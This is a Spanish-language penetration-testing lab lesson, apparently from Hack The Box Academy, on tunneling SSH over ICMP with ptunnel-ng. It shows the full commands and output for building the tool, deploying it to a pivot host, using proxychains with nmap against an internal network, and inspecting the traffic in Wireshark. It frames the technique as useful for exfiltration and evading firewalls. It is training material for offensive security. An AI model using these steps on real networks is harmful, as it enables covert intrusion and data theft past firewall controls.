ICMP tunneling encapsula tu tráfico dentro de `ICMP packets` que contienen `echo requests` y `responses`. ICMP tunneling solo funcionará cuando las respuestas de ping estén permitidas dentro de una red con firewall. Cuando a un host dentro de una red con firewall se le permite hacer ping a un servidor externo, puede encapsular su tráfico dentro del ping echo request y enviarlo a un servidor externo. El servidor externo puede validar este tráfico y enviar una respuesta adecuada, lo cual es extremadamente útil para la exfiltración de datos y la creación de túneles de pivot a un servidor externo.

Usaremos la herramienta [ptunnel-ng](https://github.com/utoni/ptunnel-ng) para crear un túnel entre nuestro servidor Ubuntu y nuestro host de ataque. Una vez creado el túnel, podremos hacer proxy de nuestro tráfico a través del `ptunnel-ng client`. Podemos iniciar el `ptunnel-ng server` en el host de pivote objetivo. Comencemos configurando ptunnel-ng.

---

## Setting Up & Using ptunnel-ng

Si ptunnel-ng no está en nuestro host de ataque, podemos clonar el proyecto usando git.

### Cloning Ptunnel-ng

```r
git clone https://github.com/utoni/ptunnel-ng.git
```

Una vez clonado el repositorio de ptunnel-ng en nuestro host de ataque, podemos ejecutar el script `autogen.sh` ubicado en la raíz del directorio ptunnel-ng.

### Building Ptunnel-ng with Autogen.sh

```r
sudo ./autogen.sh 
```

Después de ejecutar autogen.sh, ptunnel-ng puede usarse tanto del lado del cliente como del servidor. Ahora necesitaremos transferir el repositorio desde nuestro host de ataque al host objetivo. Como en secciones anteriores, podemos usar SCP para transferir los archivos. Si queremos transferir todo el repositorio y los archivos contenidos dentro, necesitaremos usar la opción `-r` con SCP.

### Transferring Ptunnel-ng to the Pivot Host

```r
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

Con ptunnel-ng en el host objetivo, podemos iniciar el lado del servidor del túnel ICMP usando el comando directamente a continuación.

### Starting the ptunnel-ng Server on the Target Host

```r
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

La dirección IP que sigue a `-r` debe ser la IP en la que queremos que ptunnel-ng acepte conexiones. En este caso, la IP que sea alcanzable desde nuestro host de ataque sería la que usaríamos. Nos beneficiaría usar este mismo pensamiento y consideración durante un engagement real.

De vuelta en el host de ataque, podemos intentar conectarnos al servidor ptunnel-ng (`-p <ipAddressofTarget>`) pero asegurándonos de que esto suceda a través del puerto local 2222 (`-l2222`). Conectarse a través del puerto local 2222 nos permite enviar tráfico a través del túnel ICMP.

### Connecting to ptunnel-ng Server from Attack Host

```r
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

Con el túnel ICMP de ptunnel-ng establecido con éxito, podemos intentar conectarnos al objetivo usando SSH a través del puerto local 2222 (`-p2222`).

### Tunneling an SSH connection through an ICMP Tunnel

```r
ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 11 May 2022 03:10:15 PM UTC

  System load:             0.0
  Usage of /:              39.6% of 13.72GB
  Memory usage:            37%
  Swap usage:              0%
  Processes:               183
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

144 updates can be applied immediately.
97 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed May 11 14:53:22 2022 from 10.10.14.18
ubuntu@WEB01:~$ 
```

Si se configura correctamente, podremos ingresar credenciales y tener una sesión SSH a través del túnel ICMP.

En el lado del cliente y del servidor de la conexión, notaremos que ptunnel-ng nos proporciona registros de sesión y estadísticas de tráfico asociadas con el tráfico que pasa a través del túnel ICMP. Esta es una forma de confirmar que nuestro tráfico está pasando del cliente al servidor utilizando ICMP.

### Viewing Tunnel Traffic Statistics

```r
[inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]: 
```

También podemos usar este túnel y SSH para realizar `dynamic port forwarding` y permitirnos usar proxychains de varias maneras.

### Enabling Dynamic Port Forwarding over SSH

```r
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>
```

Podríamos usar proxychains con Nmap para escanear objetivos en la red interna (172.16.5.x). Según nuestros descubrimientos, podemos intentar conectarnos al objetivo.

### Proxychaining through the ICMP Tunnel

```r
proxychains nmap -sV -sT 172.16.5.19 -p3389

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```

---

## Network Traffic Analysis Considerations

Es importante que confirmemos que las herramientas que estamos usando están funcionando como se espera y que las hemos configurado y estamos operando correctamente. En el caso de tunelizar tráfico a través de diferentes protocolos enseñados en esta sección con ICMP tunneling, podemos beneficiarnos de

 analizar el tráfico que generamos con un analizador de paquetes como `Wireshark`. Observa detenidamente el clip corto a continuación.

![](https://academy.hackthebox.com/storage/modules/158/analyzingTheTraffic.gif)

En la primera parte de este clip, se establece una conexión a través de SSH sin usar ICMP tunneling. Podemos notar que se captura tráfico `TCP` y `SSHv2`.

El comando usado en el clip: `ssh ubuntu@10.129.202.64`

En la segunda parte de este clip, se establece una conexión a través de SSH usando ICMP tunneling. Nota el tipo de tráfico que se captura cuando esto se realiza.

Comando usado en el clip: `ssh -p2222 -lubuntu 127.0.0.1`

---

**Note**: Cuando inicies tu objetivo, te pedimos que esperes de 3 a 5 minutos hasta que todo el laboratorio con todas las configuraciones esté configurado para que la conexión a tu objetivo funcione sin problemas.

**Note**: Considera las versiones de GLIBC, asegúrate de estar al nivel de la que está en el objetivo.